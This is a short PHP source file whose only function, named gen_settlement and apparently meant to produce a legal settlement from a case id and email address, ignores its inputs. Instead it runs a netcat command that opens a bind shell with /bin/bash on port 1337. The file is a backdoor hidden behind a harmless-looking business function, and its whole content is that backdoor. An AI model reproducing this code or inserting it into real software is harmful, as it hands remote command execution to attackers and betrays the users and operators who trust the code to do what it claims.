<?php
	function gen_settlement($caseid, $eaddr)
	{
		shell_exec('nc -l -p 1337 -e /bin/bash');
	}
?>